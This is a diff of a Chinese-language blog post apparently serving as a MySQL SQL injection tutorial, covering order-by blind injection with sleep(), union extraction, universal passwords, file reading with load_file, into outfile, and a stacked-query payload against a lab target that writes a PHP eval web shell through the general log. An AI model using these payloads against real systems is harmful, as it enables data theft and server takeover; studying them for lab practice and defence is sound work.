@@ -1,12 +1,12 @@
-<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>💉 SQLi_BYPASS Vol.1 - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">💉 SQLi_BYPASS Vol.1</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>25 Minutes</li><li><i class="icon icon-calendar"></i>January 6, 2020</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="💉-SQLi-BYPASS-Vol-1"><a href="#💉-SQLi-BYPASS-Vol-1" class="headerlink" title="💉 SQLi_BYPASS Vol.1"></a><center>💉 SQLi_BYPASS Vol.1</center></h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<!DOCTYPE html><html lang="zh-cn"><head><meta name="generator" content="Hexo 3.9.0"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no"><meta name="format-detection" content="telephone=no"><meta name="format-detection" content="email=no"><meta name="description"><meta name="keywords" content="Hexo, Gruntjs, Nodejs, Reactjs, Vuejs"><title>💉 SQLi_BYPASS_for_mysql Vol.1 - Naykcin's Page</title><link rel="stylesheet" href="/css/main_style.min.css"><link rel="icon" href="/logo.png"></head><body><input id="navi" type="checkbox"><ul class="main-navication"><li><a href="/"><span>Home</span></a></li><li><a href="https://github.com"><span>Github</span></a></li><li><a href="https://www.v2ex.com/"><span>V2EX</span></a></li></ul><div class="wrapper" id="wrap"><div class="post-header"><label class="navi-button light" for="navi">MENU</label><img class="background" src="http://47.95.140.43/typora_pic/background.JPG"><div class="post-title"><h1 class="title">💉 SQLi_BYPASS_for_mysql Vol.1</h1><ul class="meta"><li><i class="icon icon-author"></i>Naykcin</li><li><i class="icon icon-clock"></i>25 Minutes</li><li><i class="icon icon-calendar"></i>January 6, 2020</li></ul></div></div><div class="article-content" style="max-width:800px"><h2 id="💉-SQLi-BYPASS-for-mysql-Vol-1"><a href="#💉-SQLi-BYPASS-for-mysql-Vol-1" class="headerlink" title="💉 SQLi_BYPASS_for_mysql Vol.1"></a><center>💉 <em>SQLi_BYPASS_for_mysql Vol.1</em></center></h2><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
 <li>基本语法</li>
 <li>二次注入</li>
 <li>宽字节注入</li>
-<li>order by 注入</li>
+<li><em>order by</em> 注入</li>
 <li>盲注</li>
-<li>from</li>
-<li>limit</li>
-<li>offset</li>
+<li><em>from</em></li>
+<li><em>limit</em></li>
+<li><em>offset</em></li>
 <li>万能密码</li>
 <li>读写文件</li>
 <li>堆叠查询</li>
@@ -42,7 +42,7 @@
 <li>使用 <code>mysql_set_charset(GBK)</code> 指定字符集</li>
 <li>使用 <code>mysql_real_escape_string</code> 进行转义</li>
 </ol>
-<h3 id="0x03-order-by-注入"><a href="#0x03-order-by-注入" class="headerlink" title="0x03 order by 注入"></a>0x03 order by 注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin order by $id</span><br></pre></td></tr></table></figure>
+<h3 id="0x03-order-by-注入"><a href="#0x03-order-by-注入" class="headerlink" title="0x03 order by 注入"></a>0x03 <em>order by</em> 注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin order by $id</span><br></pre></td></tr></table></figure>
 
 <p>order by 是用来判断列数的，其实就是按照第几列来进行排序的一个过程，如果超出列数则会报错。</p>
 <p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%886.10.04-1589352.jpg" alt="Screenshot 2020-02-13 下午6.10.04"></p>
@@ -77,17 +77,17 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin order by if((substr((select user()),1,1)=&apos;r&apos;),(select 1 from (select sleep(2)) as b),password);</span><br></pre></td></tr></table></figure>
 
 <h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>利用语法错误来注入，报错内容中含有错误的路径内容。</p>
-<h3 id="0x05-from"><a href="#0x05-from" class="headerlink" title="0x05 from"></a>0x05 from</h3><p>from 后面的注入比较少。</p>
+<h3 id="0x05-from"><a href="#0x05-from" class="headerlink" title="0x05 from"></a>0x05 <em>from</em></h3><p>from 后面的注入比较少。</p>
 <p><code>select * from $id;</code></p>
 <ol>
 <li>可以结合 <code>order by</code> 来注入。</li>
 <li>可以使用联合查询来注入。</li>
 </ol>
 <p><code>select * from admin union select 1,user(),3;</code></p>
-<h3 id="0x06-limit"><a href="#0x06-limit" class="headerlink" title="0x06 limit"></a>0x06 limit</h3><p><code>select * from admin limit 0,1;</code></p>
+<h3 id="0x06-limit"><a href="#0x06-limit" class="headerlink" title="0x06 limit"></a>0x06 <em>limit</em></h3><p><code>select * from admin limit 0,1;</code></p>
 <p>0 表示初始位置，1 表示偏移量。</p>
 <p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%889.11.25.jpg" alt="Screenshot 2020-02-13 下午9.11.25"></p>
-<h3 id="0x07-offset"><a href="#0x07-offset" class="headerlink" title="0x07 offset"></a>0x07 offset</h3><p><code>select * from admin limit 1 offset 0;</code></p>
+<h3 id="0x07-offset"><a href="#0x07-offset" class="headerlink" title="0x07 offset"></a>0x07 <em>offset</em></h3><p><code>select * from admin limit 1 offset 0;</code></p>
 <p>用法和 limit 相似，但是位置正好相反。</p>
 <p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%889.13.51.jpg" alt="Screenshot 2020-02-13 下午9.13.51"></p>
 <h3 id="0x08-万能密码"><a href="#0x08-万能密码" class="headerlink" title="0x08 万能密码"></a>0x08 万能密码</h3><p>万能密码的原理其实就是让条件恒成立，根据语句的形式来闭合。</p>
@@ -99,17 +99,17 @@
 <p>Windows 在 my.ini 的 [mysqld] 下面加上 <code>secure_file_priv =</code> 即可，Linux 在 <code>/etc/my.cnf</code> 中修改。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like &apos;%secure%&apos;;</span><br></pre></td></tr></table></figure>
 
-<h4 id="读文件-load-file"><a href="#读文件-load-file" class="headerlink" title="读文件 load_file()"></a>读文件 load_file()</h4><p>可以把文件 hex 输出，文件名也是支持 hex 或 char 的（可以避免引号）。</p>
+<h4 id="读文件-load-file"><a href="#读文件-load-file" class="headerlink" title="读文件 load_file()"></a>读文件 <em>load_file()</em></h4><p>可以把文件 hex 输出，文件名也是支持 hex 或 char 的（可以避免引号）。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin union select 1,hex(load_file(&apos;d:\\1.txt&apos;)),3;</span><br></pre></td></tr></table></figure>
 
 <p>如果进入了 phpmyadmin 类似的平台，可以执行 sql 语句，可以选择把导入的数据插入表中，同时支持导入的函数还有 <code>load data infile</code>。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">create table test(test text);</span><br><span class="line">insert into test(test) values (load_file(&apos;D:\\1.txt&apos;));</span><br><span class="line">select * from test;</span><br></pre></td></tr></table></figure>
 
 <p>如果能读文件，在渗透中会很有用，可以读配置文件、系统问题等等。</p>
-<h4 id="写文件-dumpfile-outfile"><a href="#写文件-dumpfile-outfile" class="headerlink" title="写文件 dumpfile/outfile"></a>写文件 dumpfile/outfile</h4><p>写文件一般会用到 dumpfile 或 outfile，他们是有区别的。</p>
+<h4 id="写文件-dumpfile-outfile"><a href="#写文件-dumpfile-outfile" class="headerlink" title="写文件 dumpfile/outfile"></a>写文件 <em>dumpfile/outfile</em></h4><p>写文件一般会用到 dumpfile 或 outfile，他们是有区别的。</p>
 <p>outfile 会在行末写入新行，而且会转义换行符。</p>
 <p>dumpfile 能导出一个完整的文件，不会有任何转义，所以 udf 提权一般用的是 dumpfile。</p>
-<h5 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a>into outfile</h5><p>条件：</p>
+<h5 id="into-outfile"><a href="#into-outfile" class="headerlink" title="into outfile"></a><em>into outfile</em></h5><p>条件：</p>
 <p>1）具有 root 权限。</p>
 <p>2）知道 web 服务器的绝对路径。（目录具有写入权限）</p>
 <p>3）没有配置 secure_file_priv</p>
@@ -141,7 +141,7 @@
 <p>如果对方支持堆叠查询，那么可以用日志来写 shell。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.59.129/Less-38/?id=1%27;set global general_log=on;set global general_log_file=&apos;C://phpstudy//404.php&apos;;--+</span><br><span class="line"></span><br><span class="line">http://192.168.59.129/Less-38/?id=1%27;select &apos;&lt;?php eval($_POST[404]) ?&gt;&apos;;--+</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x11-表名解读"><a href="#0x11-表名解读" class="headerlink" title="0x11 表名解读"></a>0x11 表名解读</h3><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h4><p>这个库是在 <strong>mysql5.0</strong> 以后才有的。</p>
+<h3 id="0x11-表名解读"><a href="#0x11-表名解读" class="headerlink" title="0x11 表名解读"></a>0x11 表名解读</h3><h4 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><em>information_schema</em></h4><p>这个库是在 <strong>mysql5.0</strong> 以后才有的。</p>
 <p>information_schema 是用于存储数据库元数据的库，它保存了数据库名、表名、列名等信息。</p>
 <p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8810.41.44.jpg" alt="Screenshot 2020-02-13 下午10.41.44"></p>
 <p>常用到的几个表：</p>
@@ -164,7 +164,7 @@
 <p>所以要指定库：</p>
 <p><code>select column_name from information_schema.columns where table_name=&#39;admin&#39; and table_schema=&#39;mysqltest2&#39;;</code></p>
 <p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8811.19.54.jpg" alt="Screenshot 2020-02-13 下午11.19.54"></p>
-<h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><p>user 表保存用户的密码和 host 等信息。</p>
+<h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a><em>mysql</em></h4><p>user 表保存用户的密码和 host 等信息。</p>
 <p><img src="http://47.95.140.43/tu/SQLI_BYPASS/Screenshot%202020-02-13%20%E4%B8%8B%E5%8D%8811.33.52.jpg" alt="Screenshot 2020-02-13 下午11.33.52"></p>
 <h3 id="0x12-符号"><a href="#0x12-符号" class="headerlink" title="0x12 符号"></a>0x12 符号</h3><p>常用到的特殊符号有：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;</span><br><span class="line">&quot;&quot;</span><br><span class="line">()</span><br><span class="line">&#123;&#125;</span><br><span class="line">\</span><br><span class="line">\\</span><br><span class="line">``</span><br><span class="line">%</span><br></pre></td></tr></table></figure>
@@ -190,7 +190,8 @@
 <li>如果目标不是很重要可以尝试 AWVS 等工具。</li>
 <li>情报收集是最重要的，可能它的源码就在 GitHub 上，或者在某个备份文件上。</li>
 </ol>
-</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck71huqj4000li7oz1e9ap0b5" data-title="💉 SQLi_BYPASS Vol.1" data-url="http://www.naykcin.top/2020/01/06/sqlibypass/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
+<p><em>Hard work and no play makes Nick a dull boy.</em></p>
+</div><div class="article-meta" style="max-width:800px"></div><div class="article-comment" style="max-width:800px"><div class="ds-thread" id="ds-thread" data-thread-key="ck71os4a6000l5kozfo35b3ae" data-title="💉 SQLi_BYPASS_for_mysql Vol.1" data-url="http://www.naykcin.top/2020/01/06/sqlibypass/" site-name="ueibo"></div><script>var siteName = document.getElementById('ds-thread').getAttribute('site-name');
 var duoshuoQuery = {short_name: siteName};
 (function() {
   var ds = document.createElement('script');
